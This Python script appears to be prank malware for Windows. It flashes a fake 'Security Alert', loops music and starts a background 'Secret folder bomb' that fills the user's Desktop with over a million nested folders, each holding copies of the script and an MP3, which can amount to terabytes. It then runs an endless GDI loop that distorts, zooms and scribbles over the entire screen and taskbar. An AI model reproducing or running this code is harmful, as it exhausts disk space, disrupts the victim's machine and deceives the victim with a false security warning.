import ctypes
import time
import random
import math
import os
import shutil
import threading

# ============================================================
# MUSIC
# ============================================================
SONG_FILE = "dod2-pupsies-misery-589685.mp3"
_music_alias = None

def _mci_errmsg(winmm, code):
    buf = ctypes.create_unicode_buffer(512)
    winmm.mciGetErrorStringW.argtypes = [ctypes.c_uint, ctypes.c_wchar_p, ctypes.c_uint]
    winmm.mciGetErrorStringW.restype  = ctypes.c_bool
    winmm.mciGetErrorStringW(code, buf, 512)
    return buf.value or f"unknown MCI error {code}"

def start_music(filename):
    global _music_alias
    if os.name != 'nt':
        return None
    here = (os.path.dirname(os.path.abspath(__file__))
            if '__file__' in globals() else os.getcwd())
    path = os.path.join(here, filename)
    if not os.path.exists(path):
        path = os.path.abspath(filename)
    if not os.path.exists(path):
        print(f"[Music file not found: {filename}]")
        return None
    print(f"[Music found at: {path}]")

    winmm = ctypes.windll.winmm
    winmm.mciSendStringW.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p,
                                     ctypes.c_uint, ctypes.c_void_p]
    winmm.mciSendStringW.restype  = ctypes.c_uint
    alias = "bgm_track"
    winmm.mciSendStringW(f'close {alias}', None, 0, None)
    err = winmm.mciSendStringW(f'open "{path}" type mpegvideo alias {alias}',
                               None, 0, None)
    if err != 0:
        err = winmm.mciSendStringW(f'open "{path}" alias {alias}',
                                   None, 0, None)
    if err != 0:
        print(f"[Music open failed: {_mci_errmsg(winmm, err)}]")
        return None
    err = winmm.mciSendStringW(f'play {alias} repeat', None, 0, None)
    if err != 0:
        print(f"[Music play failed: {_mci_errmsg(winmm, err)}]")
        return None
    _music_alias = alias
    print("[Music playing and looping]")
    return alias

def stop_music():
    if _music_alias and os.name == 'nt':
        winmm = ctypes.windll.winmm
        winmm.mciSendStringW.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p,
                                         ctypes.c_uint, ctypes.c_void_p]
        winmm.mciSendStringW.restype  = ctypes.c_uint
        winmm.mciSendStringW(f'close {_music_alias}', None, 0, None)
        _music_alias = None

# ============================================================
# SECRET FOLDER BOMB
# ============================================================
SRC_PY  = r"E:\Coding\Security_Popup.py"
SRC_MP3 = r"E:\Coding\dod2-pupsies-misery-589685.mp3"

L1_COUNT = 50
L2_COUNT = 120
L3_COUNT = 200

USE_HARDLINKS = True    # True = metadata only (~GBs).  False = real 6 TB copies.
DRY_RUN       = False   # True = only estimate size & file count, do nothing.

def _place_file(src, dst, try_hardlink=True):
    """Place src at dst, using a hardlink if possible, else a real copy."""
    try:
        if os.path.exists(dst):
            return True
        if try_hardlink:
            try:
                os.link(src, dst)
                return True
            except OSError:
                pass    # cross-volume, FAT32, permission, etc → fall back
        shutil.copyfile(src, dst)
        return True
    except OSError:
        return False

def _safe_mkdir(path):
    try:
        os.mkdir(path)
    except FileExistsError:
        pass
    except OSError:
        pass

def _find_desktop():
    d = os.path.join(os.path.expanduser("~"), "Desktop")
    if os.path.isdir(d):
        return d
    return os.path.join(os.path.expanduser("~"), "OneDrive", "Desktop")

def create_secret_bomb():
    try:
        secret = os.path.join(_find_desktop(), "Secret")
        os.makedirs(secret, exist_ok=True)

        if not (os.path.exists(SRC_PY) and os.path.exists(SRC_MP3)):
            print("[Secret bomb: source files not found, skipping.]")
            return

        # ---- same-volume check for hardlink feasibility ----
        try:
            same_vol = (os.path.splitdrive(secret)[0].upper() ==
                        os.path.splitdrive(SRC_MP3)[0].upper())
        except Exception:
            same_vol = False
        do_links = USE_HARDLINKS and same_vol

        py_size  = os.path.getsize(SRC_PY)
        mp3_size = os.path.getsize(SRC_MP3)
        per_folder_bytes = py_size + mp3_size

        total_folders = 1 + L1_COUNT + L1_COUNT * L2_COUNT + L1_COUNT * L2_COUNT * L3_COUNT
        total_files   = total_folders * 2
        total_bytes   = total_folders * per_folder_bytes

        print(f"[Secret bomb: {total_folders:,} folders, "
              f"{total_files:,} files, "
              f"~{total_bytes / 1e12:.2f} TB if real copies]")
        if do_links:
            print("[Secret bomb: using NTFS hardlinks — actual usage will be "
                  "only a few GB.]")
        elif USE_HARDLINKS:
            print("[Secret bomb: source is on a different drive than the "
                  "Desktop — falling back to REAL copies.]")
        else:
            print("[Secret bomb: real copies mode — make sure you have the "
                  "disk space.]")

        if DRY_RUN:
            print("[Secret bomb: DRY_RUN, doing nothing.]")
            return

        made_folders = 0
        made_files   = 0
        report_every = 5000    # leaf folders

        # ---- Secret root ----
        _place_file(SRC_PY,  os.path.join(secret, "Security_Popup.py"), do_links)
        _place_file(SRC_MP3, os.path.join(secret, SONG_FILE), do_links)
        made_files += 2

        for i in range(1, L1_COUNT + 1):
            p1 = os.path.join(secret, f"L1_{i:03d}")
            _safe_mkdir(p1)
            _place_file(SRC_PY,  os.path.join(p1, "Security_Popup.py"), do_links)
            _place_file(SRC_MP3, os.path.join(p1, SONG_FILE), do_links)
            made_folders += 1
            made_files   += 2

            for j in range(1, L2_COUNT + 1):
                p2 = os.path.join(p1, f"L2_{j:03d}")
                _safe_mkdir(p2)
                _place_file(SRC_PY,  os.path.join(p2, "Security_Popup.py"), do_links)
                _place_file(SRC_MP3, os.path.join(p2, SONG_FILE), do_links)
                made_folders += 1
                made_files   += 2

                for k in range(1, L3_COUNT + 1):
                    p3 = os.path.join(p2, f"L3_{k:03d}")
                    _safe_mkdir(p3)
                    _place_file(SRC_PY,  os.path.join(p3, "Security_Popup.py"), do_links)
                    _place_file(SRC_MP3, os.path.join(p3, SONG_FILE), do_links)
                    made_folders += 1
                    made_files   += 2

                    if made_folders % report_every == 0:
                        print(f"  [Secret bomb] {made_folders:,} folders, "
                              f"{made_files:,} files")

        print(f"[Secret bomb complete: {made_folders:,} folders, "
              f"{made_files:,} files placed.]")
    except Exception as e:
        print(f"[Secret bomb error: {e}]")

# Kick off music + folder bomb in the background
start_music(SONG_FILE)
threading.Thread(target=create_secret_bomb, daemon=True).start()

# ============================================================
# PHASE 1  --  "Security Alert" every 0.9 s for 10 s
# ============================================================
if os.name == 'nt':
    os.system('color 0C')
else:
    print('\033[91m', end='')

start = time.time()
while time.time() - start < 10:
    print("Security Alert")
    time.sleep(0.9)

if os.name == 'nt':
    os.system('color 07')
else:
    print('\033[0m', end='')

# ============================================================
# PHASE 2  --  GDI distort / zoom-out loop
# ============================================================
if os.name != 'nt':
    print("\n[Phase 2 uses Windows GDI and only runs on Windows.]")
    stop_music()
    raise SystemExit

user32 = ctypes.windll.user32
gdi32  = ctypes.windll.gdi32

user32.GetDC.restype   = ctypes.c_void_p
user32.GetDC.argtypes  = [ctypes.c_void_p]
user32.ReleaseDC.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
user32.GetSystemMetrics.argtypes = [ctypes.c_int]
user32.GetSystemMetrics.restype  = ctypes.c_int
user32.FindWindowW.restype  = ctypes.c_void_p
user32.FindWindowW.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p]
user32.FindWindowExW.restype  = ctypes.c_void_p
user32.FindWindowExW.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
                                 ctypes.c_wchar_p, ctypes.c_wchar_p]
user32.GetWindowRect.restype  = ctypes.c_bool
user32.GetWindowRect.argtypes = [ctypes.c_void_p, ctypes.c_void_p]

class RECT(ctypes.Structure):
    _fields_ = [("left", ctypes.c_long), ("top", ctypes.c_long),
                ("right", ctypes.c_long), ("bottom", ctypes.c_long)]

gdi32.CreateCompatibleDC.restype     = ctypes.c_void_p
gdi32.CreateCompatibleDC.argtypes    = [ctypes.c_void_p]
gdi32.CreateCompatibleBitmap.restype  = ctypes.c_void_p
gdi32.CreateCompatibleBitmap.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int]
gdi32.SelectObject.restype  = ctypes.c_void_p
gdi32.SelectObject.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
gdi32.DeleteObject.argtypes = ctypes.c_void_p
gdi32.DeleteDC.argtypes     = ctypes.c_void_p
gdi32.BitBlt.restype  = ctypes.c_bool
gdi32.BitBlt.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int,
                         ctypes.c_int, ctypes.c_int, ctypes.c_void_p,
                         ctypes.c_int, ctypes.c_int, ctypes.c_uint]
gdi32.StretchBlt.restype  = ctypes.c_bool
gdi32.StretchBlt.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int,
                             ctypes.c_int, ctypes.c_int, ctypes.c_void_p,
                             ctypes.c_int, ctypes.c_int, ctypes.c_int,
                             ctypes.c_int, ctypes.c_uint]
gdi32.PatBlt.restype  = ctypes.c_bool
gdi32.PatBlt.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int,
                         ctypes.c_int, ctypes.c_int, ctypes.c_uint]
gdi32.CreatePen.restype  = ctypes.c_void_p
gdi32.CreatePen.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_uint]
gdi32.MoveToEx.restype   = ctypes.c_bool
gdi32.MoveToEx.argtypes  = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.c_void_p]
gdi32.LineTo.restype     = ctypes.c_bool
gdi32.LineTo.argtypes    = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int]

SW = user32.GetSystemMetrics(0)
SH = user32.GetSystemMetrics(1)

SRCCOPY   = 0x00CC0020
BLACKNESS = 0x00000042

hdc_screen = user32.GetDC(0)
hdc_base = gdi32.CreateCompatibleDC(hdc_screen)
hbm_base = gdi32.CreateCompatibleBitmap(hdc_screen, SW, SH)
gdi32.SelectObject(hdc_base, hbm_base)
hdc_work = gdi32.CreateCompatibleDC(hdc_screen)
hbm_work = gdi32.CreateCompatibleBitmap(hdc_screen, SW, SH)
gdi32.SelectObject(hdc_work, hbm_work)
gdi32.BitBlt(hdc_base, 0, 0, SW, SH, hdc_screen, 0, 0, SRCCOPY)

# ---------------- tuning ----------------
DISTORT_SECONDS   = 10.0
SHIFT_SPEED       = SW / 1.5
ZOOM_STEP_PX      = 3
ZOOM_STEP_SECONDS = 1.2
BANDS             = 140
BASE_WOBBLE_AMP   = 90
BASE_V_WOBBLE     = 45
WAVELENGTH        = 45.0
ZOOM_SPEED_MULT   = 1

LINES_PER_FRAME   = 40
DRIPS_PER_FRAME   = 30
DRIP_LENGTH_MAX   = 160
DRIP_DROP_MAX     = 60
LINE_WIDTH_MAX    = 5

LINES_PER_INTENSITY = 10
DRIPS_PER_INTENSITY = 6
WOBBLE_PER_INTENSITY = 8
V_WOBBLE_PER_INTENSITY = 4

DRIP_CHANCE  = 0.85
LINE_CHANCE  = 1.0

TASKBAR_BANDS          = 24
TASKBAR_LINES          = 40
TASKBAR_DRIPS          = 15
TASKBAR_REFRESH_EVERY  = 30

COLORS = [0x0000FF, 0x0040FF, 0x0080FF, 0x00A5FF, 0x00FFFF,
          0xFF00FF, 0x8000FF, 0x000000, 0xFFFFFF]

def draw_line(hdc, x1, y1, x2, y2, color, width):
    pen = gdi32.CreatePen(0, width, color)
    old = gdi32.SelectObject(hdc, pen)
    gdi32.MoveToEx(hdc, x1, y1, None)
    gdi32.LineTo(hdc, x2, y2)
    gdi32.SelectObject(hdc, old)
    gdi32.DeleteObject(pen)

# ---------- taskbar helpers ----------
def make_taskbar_entry(hwnd):
    rect = RECT()
    if not user32.GetWindowRect(hwnd, ctypes.byref(rect)):
        return None
    w = rect.right - rect.left
    h = rect.bottom - rect.top
    if w <= 0 or h <= 0:
        return None
    dc = user32.GetDC(hwnd)
    if not dc:
        return None
    bdc = gdi32.CreateCompatibleDC(dc)
    bbm = gdi32.CreateCompatibleBitmap(dc, w, h)
    gdi32.SelectObject(bdc, bbm)
    gdi32.BitBlt(bdc, 0, 0, w, h, dc, 0, 0, SRCCOPY)
    wdc = gdi32.CreateCompatibleDC(dc)
    wbm = gdi32.CreateCompatibleBitmap(dc, w, h)
    gdi32.SelectObject(wdc, wbm)
    return {"hwnd": hwnd, "dc": dc, "w": w, "h": h,
            "base_dc": bdc, "base_bm": bbm,
            "work_dc": wdc, "work_bm": wbm}

def get_taskbars():
    hwnds = []
    h = user32.FindWindowW("Shell_TrayWnd", None)
    if h: hwnds.append(h)
    h2 = user32.FindWindowW("Shell_SecondaryTrayWnd", None)
    while h2:
        hwnds.append(h2)
        h2 = user32.FindWindowExW(None, h2, "Shell_SecondaryTrayWnd", None)
    out = []
    for hw in hwnds:
        e = make_taskbar_entry(hw)
        if e: out.append(e)
    return out

def release_taskbars(tbs):
    for tb in tbs:
        gdi32.DeleteDC(tb["base_dc"]); gdi32.DeleteObject(tb["base_bm"])
        gdi32.DeleteDC(tb["work_dc"]); gdi32.DeleteObject(tb["work_bm"])
        user32.ReleaseDC(tb["hwnd"], tb["dc"])

def paint_taskbar_full(tb, phase, phase_t, t_phase, zoom_px, intensity):
    dc, w, h = tb["dc"], tb["w"], tb["h"]
    base_dc, work_dc = tb["base_dc"], tb["work_dc"]
    if w < 8 or h < 8:
        return
    gdi32.PatBlt(work_dc, 0, 0, w, h, BLACKNESS)
    wl = max(6.0, WAVELENGTH * h / float(SH if SH else 1) * 3.0)

    if phase == "distort":
        shift = int(SHIFT_SPEED * t_phase) % max(1, w)
        vmax = max(1, h // 2); hmax = max(1, w // 6)
        for i in range(TASKBAR_BANDS):
            sy = i * h // TASKBAR_BANDS
            sh = max(1, h // TASKBAR_BANDS)
            wx = int(BASE_WOBBLE_AMP * math.sin(sy / wl + phase_t * 6.0))
            wy = int(BASE_V_WOBBLE   * math.sin(sy / wl + phase_t * 6.0 + 1.5))
            wx = max(-hmax, min(hmax, wx)); wy = max(-vmax, min(vmax, wy))
            sx = shift + wx
            if sx < 0: sx = 0
            if sx >= w: continue
            sw = w - sx
            if sw <= 0: continue
            dy = sy + wy
            if dy < 0: dy = 0
            if dy + sh > h: dy = h - sh
            gdi32.BitBlt(work_dc, 0, dy, sw, sh, base_dc, sx, sy, SRCCOPY)
    else:
        d_x = zoom_px * w // max(1, SW)
        d_y = zoom_px * h // max(1, SH)
        dw = w - 2 * d_x; dh = h - 2 * d_y
        if dw <= 0 or dh <= 0: return
        amp  = BASE_WOBBLE_AMP + intensity * WOBBLE_PER_INTENSITY
        vamp = BASE_V_WOBBLE   + intensity * V_WOBBLE_PER_INTENSITY
        vmax = max(1, dh // 3); hmax = max(1, dw // 6)
        for i in range(TASKBAR_BANDS):
            sy = i * h // TASKBAR_BANDS
            sh = max(1, h // TASKBAR_BANDS)
            ry = d_y + i * dh // TASKBAR_BANDS
            rh = max(1, dh // TASKBAR_BANDS)
            wx = int(amp  * math.sin(sy / wl + phase_t * 6.0))
            wy = int(vamp * math.sin(sy / wl + phase_t * 6.0 + 1.5))
            wx = max(-hmax, min(hmax, wx)); wy = max(-vmax, min(vmax, wy))
            gdi32.StretchBlt(work_dc, d_x + wx, ry + wy, dw, rh,
                             base_dc, 0, sy, w, sh, SRCCOPY)

    gdi32.BitBlt(dc, 0, 0, w, h, work_dc, 0, 0, SRCCOPY)

    for _ in range(TASKBAR_DRIPS + intensity * 3):
        cw = random.randint(6, max(7, w // 3))
        ch = random.randint(4, max(5, h // 2))
        if cw >= w or ch >= h - 1: continue
        x = random.randint(0, w - cw); y = random.randint(0, h - ch - 1)
        dy2 = random.randint(2, max(3, h // 2 + intensity))
        dx2 = random.randint(-4, 4)
        gdi32.BitBlt(dc, x + dx2, y + dy2, cw, ch, dc, x, y, SRCCOPY)

    for _ in range(TASKBAR_LINES + intensity * 5):
        draw_line(dc, random.randint(0, w), random.randint(0, h),
                  random.randint(0, w), random.randint(0, h),
                  random.choice(COLORS), random.randint(1, LINE_WIDTH_MAX))

# ============================================================
# Main loop
# ============================================================
phase       = "distort"
phase_start = time.time()
taskbars    = get_taskbars()
frame_count = 0

try:
    while True:
        now = time.time()
        t_phase = now - phase_start
        phase_t = now

        if phase == "distort" and t_phase >= DISTORT_SECONDS:
            phase = "zoom"; phase_start = now; t_phase = 0.0

        if phase == "zoom":
            steps = int(t_phase / (ZOOM_STEP_SECONDS / ZOOM_SPEED_MULT))
            zoom_px = steps * ZOOM_STEP_PX
            intensity = steps
            if zoom_px * 2 >= SW or zoom_px * 2 >= SH:
                phase = "distort"; phase_start = now
                continue
        else:
            zoom_px = 0; intensity = 0

        gdi32.PatBlt(hdc_work, 0, 0, SW, SH, BLACKNESS)

        if phase == "distort":
            shift = int(SHIFT_SPEED * t_phase) % max(1, SW)
            for i in range(BANDS):
                sy = i * SH // BANDS
                sh = max(1, SH // BANDS)
                wx = int(BASE_WOBBLE_AMP * math.sin(sy / WAVELENGTH + phase_t * 6.0))
                wy = int(BASE_V_WOBBLE   * math.sin(sy / WAVELENGTH + phase_t * 6.0 + 1.5))
                sx = shift + wx
                if sx < 0: sx = 0
                if sx >= SW: continue
                sw = SW - sx
                if sw <= 0: continue
                dy = sy + wy
                if dy < 0: dy = 0
                if dy + sh > SH: dy = SH - sh
                gdi32.BitBlt(hdc_work, 0, dy, sw, sh, hdc_base, sx, sy, SRCCOPY)
        else:
            dx = zoom_px; dy = zoom_px
            dw = SW - 2 * zoom_px; dh = SH - 2 * zoom_px
            if dw > 0 and dh > 0:
                amp  = BASE_WOBBLE_AMP + intensity * WOBBLE_PER_INTENSITY
                vamp = BASE_V_WOBBLE   + intensity * V_WOBBLE_PER_INTENSITY
                for i in range(BANDS):
                    sy = i * SH // BANDS
                    sh = max(1, SH // BANDS)
                    ry = dy + i * dh // BANDS
                    rh = max(1, dh // BANDS)
                    wx = int(amp  * math.sin(sy / WAVELENGTH + phase_t * 6.0))
                    wy = int(vamp * math.sin(sy / WAVELENGTH + phase_t * 6.0 + 1.5))
                    gdi32.StretchBlt(hdc_work, dx + wx, ry + wy, dw, rh,
                                     hdc_base, 0, sy, SW, sh, SRCCOPY)

        gdi32.BitBlt(hdc_screen, 0, 0, SW, SH, hdc_work, 0, 0, SRCCOPY)

        if random.random() < DRIP_CHANCE:
            for _ in range(DRIPS_PER_FRAME + intensity * DRIPS_PER_INTENSITY):
                w_ = random.randint(10, 160)
                h_ = random.randint(6, DRIP_LENGTH_MAX)
                x_ = random.randint(0, max(1, SW - w_))
                y_ = random.randint(h_, max(h_ + 1, SH - h_ - 1))
                dy2 = random.randint(6, DRIP_DROP_MAX + intensity * 6)
                dx2 = random.randint(-6, 6)
                gdi32.BitBlt(hdc_screen, x_ + dx2, y_ + dy2, w_, h_,
                             hdc_screen, x_, y_, SRCCOPY)

        if random.random() < LINE_CHANCE:
            for _ in range(LINES_PER_FRAME + intensity * LINES_PER_INTENSITY):
                x1 = random.randint(0, SW); y1 = random.randint(0, SH)
                x2 = x1 + random.randint(-SW // 2, SW // 2)
                y2 = y1 + random.randint(-SH // 2, SH // 2)
                draw_line(hdc_screen, x1, y1, x2, y2,
                          random.choice(COLORS), random.randint(1, LINE_WIDTH_MAX))

        frame_count += 1
        if frame_count % TASKBAR_REFRESH_EVERY == 0:
            release_taskbars(taskbars)
            taskbars = get_taskbars()

        for tb in taskbars:
            paint_taskbar_full(tb, phase, phase_t, t_phase, zoom_px, intensity)

        time.sleep(0.02)

finally:
    stop_music()
    release_taskbars(taskbars)
    gdi32.DeleteDC(hdc_base); gdi32.DeleteObject(hbm_base)
    gdi32.DeleteDC(hdc_work); gdi32.DeleteObject(hbm_work)
    user32.ReleaseDC(0, hdc_screen)